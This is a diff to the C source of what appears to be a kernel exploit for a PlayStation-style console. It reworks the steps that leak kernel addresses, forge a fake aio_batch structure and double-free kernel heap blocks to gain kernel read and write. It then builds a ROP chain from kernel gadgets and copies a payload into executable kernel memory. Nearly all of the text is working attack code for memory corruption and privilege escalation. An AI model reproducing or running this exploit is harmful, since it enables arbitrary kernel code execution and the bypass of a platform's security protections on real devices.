@@ -724,7 +724,6 @@ int32_t leak_kernel_addrs()
     set_evf_flags(s2.evf, 0xff00);
     s2.len *= NUM_LEAKED_BLOCKS;
 
-
     SceKernelAioRWRequest leak_reqs[NUM_ELEMS] = {0};
     SceKernelAioSubmitId leak_ids[NUM_ELEMS * NUM_HANDLES] = {0};
 
@@ -824,6 +823,7 @@ int32_t leak_kernel_addrs()
     // and this would result in a crash as .ar2_reqs1 does not have it. Thus,
     // the line `leak_reqs[0].buf = ucred` will fake it to prevent the crash.
 
+    /*
     printf_debug("* Faking an aio_batch\n");
 
     int32_t *sds = s0.sds;
@@ -886,6 +886,7 @@ int32_t leak_kernel_addrs()
     s2.batch_p = s2.evf_p + batch_off;
     printf_debug("Fake aio_batch address: 0x%08x%08x\n",
         (uint32_t)(s2.batch_p >> 32), (uint32_t)s2.batch_p);
+    */
 
     return err;
 }
@@ -940,6 +941,7 @@ int32_t make_aliased_pktopts()
     return -1;
 }
 
+/*
 SceKernelEventFlag aliased_evfs[2] = {0, 0};
 
 // returns 0 on success, -1 on failure
@@ -973,10 +975,13 @@ int32_t make_aliased_evfs()
     printf_debug("Failed to make aliased evfs!\n");
     return -1;
 }
+*/
 
 #define MAX_LEAK_LEN 0x800
 #define NUM_BATCHES 2
 #define NUM_CLOBBERS 8
+
+int32_t dirty_sd = -1;
 
 // Sets err, returns err
 int32_t double_free_reqs1()
@@ -1020,8 +1025,26 @@ int32_t double_free_reqs1()
     aio_entry *reqs2 = (aio_entry *)&rthdr;
 
     reqs2->ar2_ticket = 5; // ip6r_segleft = 5
-    reqs2->ar2_info = s2.reqs1;
-    reqs2->ar2_batch = s2.batch_p;
+    reqs2->ar2_info = s2.reqs1; // the 0x100 block to double free
+
+    // Craft a aio_batch using the end portion of the buffer
+    reqs2->ar2_batch = s2.evf_p + 0x28;
+    aio_batch *fake_batch = (aio_batch *)((uint8_t*)&rthdr + 0x28);
+
+    fake_batch->ar3_num_reqs = 1;
+    fake_batch->ar3_reqs_left = 0;
+    fake_batch->ar3_state = SCE_KERNEL_AIO_STATE_COMPLETED;
+    fake_batch->ar3_done = 0;
+    // .ar3_lock.lock_object.lo_flags = (
+    //     LO_SLEEPABLE | LO_UPGRADABLE
+    //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
+    //     | 6 << LO_CLASSSHIFT
+    //     | LO_INITIALIZED
+    // )
+    fake_batch->lock_object_flags = 0x67b0000;
+    // .ar3_lock.lk_lock = LK_UNLOCKED
+    fake_batch->lock_object_lock = 1;
+
     hexdump((uint8_t *)reqs2, 0x80);
 
     printf_debug("* Start overwrite AIO queue entry with rthdr loop\n");
@@ -1058,6 +1081,33 @@ int32_t double_free_reqs1()
                 req_idx, states[req_idx], req_id);
             printf_debug("* Found req_id at batch: %d\n", j / MAX_REQS);
 
+            // set .ar3_done to 1
+            // also enable deletion of req_id
+            aio_multi_poll(&req_id, 1, aio_errs);
+            printf_debug("aio_multi_poll errs[0] %08x\n", aio_errs[0]);
+
+            for (uint32_t k = 0; k < NUM_SDS; k++)
+            {
+                if (s0.sds[k] < 0) continue; // Skip invalid sockets
+                socklen_t len = rthdr.used_size;
+                get_rthdr(s0.sds[k], &rthdr, &len);
+                if (fake_batch->ar3_done == 1)
+                {
+                    hexdump((uint8_t *)&rthdr, 0x80);
+                    dirty_sd = s0.sds[k];
+                    s0.sds[k] = -1;
+                    free_rthdrs(s0.sds, NUM_SDS);
+                    break;
+                }
+            }
+
+            if (dirty_sd < 0)
+            {
+                printf_debug("Cannot find sd that overwrote AIO queue entry!\n");
+                return -1;
+            }
+            printf_debug("dirty_sd: %d\n", dirty_sd);
+
             goto loop_break;
         }
     }
@@ -1071,19 +1121,19 @@ int32_t double_free_reqs1()
 
     free_aios2(ids, MAX_REQS * NUM_BATCHES);
 
+    // Enable deletion of target_id
+    aio_multi_poll(&s2.target_id, 1, aio_errs);
+    printf_debug("target's state: %08x\n", aio_errs[0]);
+
     SceKernelAioError errs[2] = {-1, -1};
     SceKernelAioSubmitId target_ids[2] = {req_id, s2.target_id};
-
-    // Enable deletion of target_ids
-    aio_multi_poll(target_ids, 2, states);
-    printf_debug("Target states: %08x, %08x\n", states[0], states[1]);
     
     // Free All aio requests that were used to spray the fake aio_batch
     // Safe since aio_batch remains intact by the time aio_multi_delete() is called
-    free_aios(s2.batch_ids, NUM_HANDLES);
+    // free_aios(s2.batch_ids, NUM_HANDLES);
 
     // Free all pktopts to reclaim the 0x100 block with pktopts
-    // Free all rthdrs to reclaim the 0x80 block with evfs
+    // // Free all rthdrs to reclaim the 0x80 block with evfs
     for (uint32_t i = 0; i < NUM_SDS; i++)
     {
         if (s0.sds[i] < 0) continue; // Skip invalid sockets
@@ -1097,8 +1147,9 @@ int32_t double_free_reqs1()
     // We reclaim first since the sanity checking here is longer which makes it
     // more likely that we have another process claim the memory
 
-    // RESTORE: double freed 0x80 block has been reclaimed with harmless data
-    err = make_aliased_evfs();
+    // // RESTORE: double freed 0x80 block has been reclaimed with harmless data
+    // // err = make_aliased_evfs();
+
     // RESTORE: double freed 0x100 block has been reclaimed with harmless data
     // PANIC: 0x100 malloc zone pointers aliased
     err = make_aliased_pktopts();
@@ -1264,12 +1315,12 @@ int32_t make_kernel_arw()
 
     printf_debug("* Achieved restricted read!\n");
 
-    // Attempting to reclaim the double freed 0x80 block with rthdrs
-    free_evf(aliased_evfs[0]);
-    free_evf(aliased_evfs[1]);
-    err = make_aliased_rthdrs();
-    if (err < 0) printf_debug("Failed to reclaim double freed 0x80 block!\n");
-    else printf_debug("* Reclaimed double freed 0x80 block!\n");
+    // // Attempting to reclaim the double freed 0x80 block with rthdrs
+    // free_evf(aliased_evfs[0]);
+    // free_evf(aliased_evfs[1]);
+    // err = make_aliased_rthdrs();
+    // if (err < 0) printf_debug("Failed to reclaim double freed 0x80 block!\n");
+    // else printf_debug("* Reclaimed double freed 0x80 block!\n");
 
     // Finding the current process object
     // `ar2_info` object should have a pointer to curproc at offset 8,
@@ -1325,8 +1376,7 @@ int32_t make_kernel_arw()
     printf_debug("r_pktopts_p: 0x%08x%08x\n",
         (uint32_t)(s4.r_pktopts_p >> 32), (uint32_t)s4.r_pktopts_p);
 
-    ptr64_t d_pktopts_p = rthdr_sds[0] > 0
-        ? locate_pktopts(rthdr_sds[0], proc_ofiles) : 0;
+    ptr64_t d_pktopts_p = locate_pktopts(dirty_sd, proc_ofiles);
     printf_debug("d_pktopts_p: 0x%08x%08x\n",
         (uint32_t)(d_pktopts_p >> 32), (uint32_t)d_pktopts_p);
 
@@ -1407,14 +1457,10 @@ int32_t make_kernel_arw()
         (uint32_t)(r_rthdr_p >> 32), (uint32_t)r_rthdr_p);
     kmemory.write64(r_rthdr_p, 0);
 
-    if (rthdr_sds[0] > -1)
-    {
-        ptr64_t d_rthdr_p = d_pktopts_p + IP6PO_RTHDR_OFFSET;
-        printf_debug("d_rthdr_p: 0x%08x%08x\n",
-            (uint32_t)(d_rthdr_p >> 32), (uint32_t)d_rthdr_p);
-
-        kmemory.write64(d_rthdr_p, 0);
-    }
+    ptr64_t d_rthdr_p = d_pktopts_p + IP6PO_RTHDR_OFFSET;
+    printf_debug("d_rthdr_p: 0x%08x%08x\n",
+        (uint32_t)(d_rthdr_p >> 32), (uint32_t)d_rthdr_p);
+    kmemory.write64(d_rthdr_p, 0);
 
     printf_debug("* Corrupt pointers cleaned!\n");
 
@@ -1684,7 +1730,7 @@ int32_t run_payload()
     // Copying payload to RWX memory
     kmemory.copyin((void*)payload_start, rwx_p, payload_end - payload_start);
 
-    // Restoring pktopts_p, d_pktopts_p, and launching payload
+    // Restoring pktopts_p, r_pktopts_p, and launching payload
     fds = {-1, -1};
     create_unixpair(&fds);
     fake_buf = 0;
@@ -1737,7 +1783,7 @@ int32_t run_payload()
     kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
     kchain_buf[index++] = 0;
 
-    // Restoring d_pktopts_p
+    // Restoring r_pktopts_p
     kchain_buf[index++] = s2.kernel_base + G_POP_RDX_RET;
     kchain_buf[index++] = s4.r_pktopts_p + IPV6_PKTINFO_OFFSET;
     kchain_buf[index++] = s2.kernel_base + G_POP_QWORD_PTR_RDX_RET;
@@ -1802,8 +1848,7 @@ void cleanup()
 void restore()
 {
     printf_debug("Closing sockets...\n");
-    PS::close(rthdr_sds[0]);
-    PS::close(rthdr_sds[1]);
+    PS::close(dirty_sd);
     PS::close(pktopts_sds[0]);
     PS::close(s4.reclaim_sd);
     PS::close(s4.pipe_fds[0]);
@@ -1853,6 +1898,7 @@ void main()
     cleanup();
     jailbreak();
     run_payload();
+    // sleep_ms(10000);
     restore();
     
     end:
